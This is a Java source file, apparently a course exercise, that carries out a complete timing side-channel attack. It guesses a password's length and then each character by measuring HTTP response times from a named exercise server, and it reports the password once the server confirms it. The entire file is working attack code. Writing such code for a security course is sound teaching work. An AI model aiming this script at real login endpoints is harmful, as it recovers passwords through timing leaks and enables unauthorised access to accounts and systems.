import java.io.IOException;
import java.io.InputStream;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import static java.lang.System.exit;


public class ex01_M2 {

    // Const
    public static long NANOSECONDS_IN_MILLISECONDS = 1000000;
    public static char[] AVAILABLE_PASSWORD_CHAR = new char[]{'0','1','2','3','4','5','6','7','8','9', 'a','b','c','d','e','f','g',
            'h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G',
            'H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'};
    public static String TEST_CHAR = "!";

    // Configuration
    public static int MIN_PASSWORD_LENGTH = 1;
    public static int MAX_PASSWORD_LENGTH = 32;
    public static int CHECK_PASSWORD_LENGTH_ATTEMPTS = 5;
    public static int CHECK_PASSWORD_CHARS_ATTEMPTS = 5;
    public static int DEBUG_MESSAGE_COUNT = 1;
    public static boolean DEBUG_MESSAGE = true;
    public static int DIFFICULTY = 1;
    public static String USER_ID = "ID";

    public static boolean DO_RATIO_CHECK = false;
    public static float MIN_RATIO = 1.05f;
    public static float MAX_RATIO = 150f;
    public static float RATIO_DIFFERENCE_FIRST_TO_SECONDS = 0.15f;

    public static boolean DO_N_TIME_CHECK = true;
    public static int N_TIME_CHECK = 2;

    // Flags
    public static long FOUND_THE_PASSWORD = -1;
    public static long ERROR_WHILE_CHECK_TIME = -2;


    /*
     Returns the current value of the most precise available system timer, in nanoseconds(10^-9 seconds).
     */
    public static long getCurrentTimeInNanoseconds() {
        return System.nanoTime();
    }

    public static long checkResponseTime(String url) {
        long start, end;
        try {
            URL site = new URL(url);

            start = getCurrentTimeInNanoseconds();
            URLConnection conn = site.openConnection();
            conn.setDoInput(true);
            conn.connect();
            InputStream stream = conn.getInputStream();
            byte[] bytesBody={0};
            stream.read(bytesBody);
            end = getCurrentTimeInNanoseconds();

            String body = new String(bytesBody);

            if("1".equals(body)){
                if(DEBUG_MESSAGE) {
                    System.out.println(url);
                    System.out.println(String.format("The %s return 1!", url));
                }
                return FOUND_THE_PASSWORD;
            }

        } catch (MalformedURLException e) {
            if(DEBUG_MESSAGE) {
                System.out.println("Invalid URL Format:");
                System.out.println(url);
            }
            return ERROR_WHILE_CHECK_TIME;
        } catch (IOException e) {
            if(DEBUG_MESSAGE) {
                System.out.println("Failed connect to the URL server:");
                System.out.println(url);
            }
            return ERROR_WHILE_CHECK_TIME;
        }

        return end - start;
    }

    public static float checkResponseTimeInMicrosecond(String url) {
        long result = checkResponseTime(url);
        float floatResult = result;
        return floatResult / 1000;
    }

    public static String buildUrlFromPassword(String password)
    {
        return String.format("http://aoi.ise.bgu.ac.il/?user=%s&password=%s&difficulty=%d", USER_ID, password, DIFFICULTY);
    }

    public static void foundTheRightPassword(String password)
    {
        if (DEBUG_MESSAGE) {
            System.out.println("The timing attack worked!");
        }
        System.out.println(USER_ID + " " + password + " " + DIFFICULTY);
    }

    public static void didntFindThePassword()
    {
        if (DEBUG_MESSAGE) {
            System.out.println("The time attack didn't work...");
        }
        System.out.println("We have a problem");
    }

    public static class PossiblePasswordData {
        Integer passwordAttempts;
        Float passwordSumTime;
        Integer passwordErrors;
        Float passwordResponseAverage;

        public PossiblePasswordData()
        {
            passwordAttempts = 0;
            passwordSumTime = 0f;
            passwordErrors = 0;
            passwordResponseAverage = 0f;
        }
    }

    public static Map<String, PossiblePasswordData> executeTimingAttack(List<String> passwordsToCheck, int numberOfAttempts, Boolean debug)
    {
        Map<String, PossiblePasswordData> result = new HashMap<String, PossiblePasswordData>();
        float responseTime;

        for (String password : passwordsToCheck) {
            result.put(password, new PossiblePasswordData());
        }

        // first call to do some setup in java:
        checkResponseTime(buildUrlFromPassword("123"));

        for (int i = 0; i < numberOfAttempts; i++)
        {
            if (debug && (i % (CHECK_PASSWORD_LENGTH_ATTEMPTS / DEBUG_MESSAGE_COUNT) == 0))
            {
                System.out.println(String.format("checked %d", i));
            }

            for (String password : passwordsToCheck) {
                responseTime = checkResponseTimeInMicrosecond(buildUrlFromPassword(password));

                if (DEBUG_MESSAGE) {
                    //System.out.println(String.format("password %s took %f microseconds", password, responseTime));
                }

                if (responseTime == FOUND_THE_PASSWORD)
                {
                    foundTheRightPassword(password);
                    exit(0);
                }
                else if (responseTime == ERROR_WHILE_CHECK_TIME)
                {
                    result.get(password).passwordErrors += 1;
                }
                else
                {
                    result.get(password).passwordAttempts += 1;
                    result.get(password).passwordSumTime += responseTime;
                }
            }
        }

        return result;
    }

    public static boolean validateAttackResults(Map<String, PossiblePasswordData> results, int checksAttempts)
    {
        for (String password : results.keySet())
        {
            if(results.get(password).passwordErrors == checksAttempts) {
                if( DEBUG_MESSAGE) {
                    System.out.println("There is password that all http request attempts failed!");
                }
                return false;
            }
        }
        return true;
    }


    public static class TimingAttackResult {

        public String password;
        public Double ratio;

        public TimingAttackResult(String password, Double ratio) {
            this.password = password;
            this.ratio = ratio;
        }

    }


    public static void calculateAverageForEachPossiblePassword(Map<String, PossiblePasswordData> results)
    {
        for (String password: results.keySet()) {
            results.get(password).passwordResponseAverage = results.get(password).passwordSumTime / results.get(password).passwordAttempts;
        }
    }

    public static double calculateTotalAverageWithoutOnePassword(Map<String, PossiblePasswordData> results, String passwordToIgnore)
    {
        double totalSum = 0;
        for (String password: results.keySet()) {
            if(password.equals(passwordToIgnore)){
                continue;
            }
            totalSum += results.get(password).passwordResponseAverage;
        }
        return totalSum / (results.size() - 1);
    }

    public static List<TimingAttackResult> calculateNBiggestRatio(int nPosition, Map<String, PossiblePasswordData> results)
    {
        List<TimingAttackResult> nBiggestRatio = new ArrayList<TimingAttackResult>();

        for (int i = 0; i < nPosition; i++) {

            Map<String, PossiblePasswordData> resultsWithoutCalculatedRatio = new HashMap<String, PossiblePasswordData>();
            for (String password: results.keySet()) {

                boolean passwordAlreadyIncluded = false;
                for (TimingAttackResult includedPassword : nBiggestRatio) {
                    if (password.equals(includedPassword.password)) {
                        passwordAlreadyIncluded = true;
                    }
                }
                if (passwordAlreadyIncluded){
                    continue;
                }
                resultsWithoutCalculatedRatio.put(password, results.get(password));
            }

            String maxRatioPassword = resultsWithoutCalculatedRatio.keySet().iterator().next();
            double maxRatio = resultsWithoutCalculatedRatio.get(maxRatioPassword).passwordResponseAverage / calculateTotalAverageWithoutOnePassword(resultsWithoutCalculatedRatio, maxRatioPassword);
            for (String password: resultsWithoutCalculatedRatio.keySet()) {
                double currentRatio = resultsWithoutCalculatedRatio.get(password).passwordResponseAverage / calculateTotalAverageWithoutOnePassword(resultsWithoutCalculatedRatio, password);
                if (currentRatio > maxRatio){
                    maxRatio = currentRatio;
                    maxRatioPassword = password;
                }
            }

            nBiggestRatio.add(new TimingAttackResult(maxRatioPassword, maxRatio));
        }

        return nBiggestRatio;
    }

    public static String getMaxAverage(Map<String, PossiblePasswordData> results)
    {
        String max = results.keySet().iterator().next();
        for (String password: results.keySet()) {
            if(results.get(password).passwordResponseAverage > results.get(max).passwordResponseAverage) {
                max = password;
            }
        }
        return max;
    }

    public static int checkPasswordLength() {
        List<String> possiblePasswords = new ArrayList<String>();

        for (int i = MIN_PASSWORD_LENGTH ; i <= MAX_PASSWORD_LENGTH ; i++)
        {
            possiblePasswords.add(new String(new char[i]).replace("\0", TEST_CHAR));
        }

        boolean foundLength = false;
        int length = 0;

        int[] possibleLength = new int[MAX_PASSWORD_LENGTH + 1];
        for (int i = 0; i <= MAX_PASSWORD_LENGTH; i++) {
            possibleLength[i] = 0;
        }

        while (!foundLength) {
            boolean attackSucceed = false;
            Map<String, PossiblePasswordData> results = null;
            while (!attackSucceed) {
                results = executeTimingAttack(possiblePasswords, CHECK_PASSWORD_LENGTH_ATTEMPTS, DEBUG_MESSAGE);
                attackSucceed = validateAttackResults(results, CHECK_PASSWORD_LENGTH_ATTEMPTS);
            }
            calculateAverageForEachPossiblePassword(results);

            for (String password : possiblePasswords) {
                if (DEBUG_MESSAGE) {
                    System.out.println(String.format("Length %d took %f milliseconds", password.length(), results.get(password).passwordResponseAverage / 1000));
                }
            }

            if (DO_RATIO_CHECK) {
                List<TimingAttackResult> ratio = calculateNBiggestRatio(3, results);
                length = ratio.get(0).password.length();
                if (DEBUG_MESSAGE) {
                    System.out.println(String.format("Length %d bigger then other by %f times", length, ratio.get(0).ratio));
                    System.out.println(String.format("Length %d bigger then other by %f times", ratio.get(1).password.length(), ratio.get(1).ratio));
                    System.out.println(String.format("Length %d bigger then other by %f times", ratio.get(2).password.length(), ratio.get(2).ratio));
                }

                if (ratio.get(0).ratio < MAX_RATIO && ratio.get(0).ratio > MIN_RATIO && (ratio.get(0).ratio - ratio.get(1).ratio) >= RATIO_DIFFERENCE_FIRST_TO_SECONDS) {
                    foundLength = true;
                }
            }
            else if(DO_N_TIME_CHECK)
            {
                int lengthWithMaxAverage = getMaxAverage(results).length();
                possibleLength[lengthWithMaxAverage] += 1;

                if (DEBUG_MESSAGE) {
                    for (int i = 0; i <= MAX_PASSWORD_LENGTH; i++) {
                        if (possibleLength[i] != 0) {
                            System.out.println(String.format("Length %d occurs %d times", i, possibleLength[i]));
                        }
                    }
                }

                if (possibleLength[lengthWithMaxAverage] >= N_TIME_CHECK) {
                    length = lengthWithMaxAverage;
                    foundLength = true;
                    if (DEBUG_MESSAGE) {
                        System.out.println(String.format("Length %d occurs %d times", lengthWithMaxAverage, N_TIME_CHECK));
                    }
                }
            }
            else {
                length = getMaxAverage(results).length();
                foundLength = true;
            }
        }

        return length;
    }

    public static String checkThePassword(int passwordLength)
    {
        Map<Character, Integer> charScore = new HashMap<Character, Integer>();

        String charactersFoundFromPassword = "";
        for (int currentPasswordIndex = 0; currentPasswordIndex < (passwordLength - 1); currentPasswordIndex++)
        {
            List<String> possiblePasswords = new ArrayList<String>();
            for (char someChar: AVAILABLE_PASSWORD_CHAR)
            {
                String password = String.format("%s%c%s", charactersFoundFromPassword, someChar,
                        new String(new char[passwordLength - currentPasswordIndex - 1]).replace("\0", TEST_CHAR));
                possiblePasswords.add(password);

                charScore.put(someChar, 0);
            }

            boolean foundNextChar = false;
            char nextChar;
            while (!foundNextChar)
            {
                boolean attackSucceed = false;
                Map<String, PossiblePasswordData> results = null;
                while (!attackSucceed)
                {
                    results = executeTimingAttack(possiblePasswords, CHECK_PASSWORD_CHARS_ATTEMPTS, DEBUG_MESSAGE);
                    attackSucceed = validateAttackResults(results, CHECK_PASSWORD_CHARS_ATTEMPTS);
                }
                calculateAverageForEachPossiblePassword(results);

                for (String password : possiblePasswords)
                {
                    if (DEBUG_MESSAGE) {
                        System.out.println(String.format("char %c took %f milliseconds", password.charAt(currentPasswordIndex), results.get(password).passwordResponseAverage / 1000));
                    }
                }

                if (DO_RATIO_CHECK)
                {
                    List<TimingAttackResult> ratio = calculateNBiggestRatio(3, results);
                    nextChar = ratio.get(0).password.charAt(currentPasswordIndex);
                    if (DEBUG_MESSAGE) {
                        System.out.println(String.format("char %c bigger then other by %f times", ratio.get(0).password.charAt(currentPasswordIndex), ratio.get(0).ratio));
                        System.out.println(String.format("char %c bigger then other by %f times", ratio.get(1).password.charAt(currentPasswordIndex), ratio.get(1).ratio));
                        System.out.println(String.format("char %c bigger then other by %f times", ratio.get(2).password.charAt(currentPasswordIndex), ratio.get(2).ratio));
                    }
                    if (ratio.get(0).ratio < MAX_RATIO && ratio.get(0).ratio > MIN_RATIO && (ratio.get(0).ratio - ratio.get(1).ratio) >= RATIO_DIFFERENCE_FIRST_TO_SECONDS)
                    {
                        foundNextChar = true;
                        charactersFoundFromPassword = String.format("%s%c", charactersFoundFromPassword, nextChar);
                    }
                }
                else if(DO_N_TIME_CHECK)
                {
                    char possibleNextChar = getMaxAverage(results).charAt(currentPasswordIndex);
                    charScore.put(possibleNextChar, charScore.get(possibleNextChar) + 1);

                    if (DEBUG_MESSAGE) {
                        for (char c: charScore.keySet()) {
                            if (charScore.get(c) != 0) {
                                System.out.println(String.format("Char %c occurs %d times", c, charScore.get(c)));
                            }
                        }
                    }

                    if (charScore.get(possibleNextChar) >= N_TIME_CHECK)
                    {
                        if (DEBUG_MESSAGE) {
                            System.out.println(String.format("Char %c occurs %d times", possibleNextChar, N_TIME_CHECK));
                        }
                        nextChar = possibleNextChar;
                        foundNextChar = true;
                        charactersFoundFromPassword = String.format("%s%c", charactersFoundFromPassword, nextChar);
                    }
                }
                else {
                    nextChar = getMaxAverage(results).charAt(currentPasswordIndex);
                    charactersFoundFromPassword = String.format("%s%c", charactersFoundFromPassword, nextChar);
                    foundNextChar = true;
                }

                if (DEBUG_MESSAGE) {
                    System.out.println(String.format("Password (length %d) until now is %s", passwordLength, charactersFoundFromPassword));
                }
            }
        }

        return checkLastCharInThePassword(charactersFoundFromPassword);
    }

    public static String checkLastCharInThePassword(String passwordUntilNow)
    {
        List<String> possiblePasswords = new ArrayList<String>();
        for (char someChar: AVAILABLE_PASSWORD_CHAR)
        {
            String password = String.format("%s%c", passwordUntilNow, someChar);
            possiblePasswords.add(password);
        }

        for (String password : possiblePasswords) {
            long result = ERROR_WHILE_CHECK_TIME;
            int errorRetryCount = 10;
            while (ERROR_WHILE_CHECK_TIME == result && errorRetryCount != 0) {
                result = checkResponseTime(buildUrlFromPassword(password));
                if (FOUND_THE_PASSWORD == result)
                {
                    foundTheRightPassword(password);
                    return password;
                }
                errorRetryCount -= 1;
            }
        }
        didntFindThePassword();
        return "";
    }

    public static void main(String[] args) {
        long startTime = getCurrentTimeInNanoseconds();
        int passwordLength = checkPasswordLength();
        if(DEBUG_MESSAGE) {
            System.out.println(String.format("Password length is %d", passwordLength));
        }

        String password = checkThePassword(passwordLength);
        if(DEBUG_MESSAGE) {
            System.out.println(String.format("The password is %s", password));
            System.out.println(String.format("took %d seconds", (getCurrentTimeInNanoseconds() - startTime) / (NANOSECONDS_IN_MILLISECONDS * 1000)));
        }
    }
}
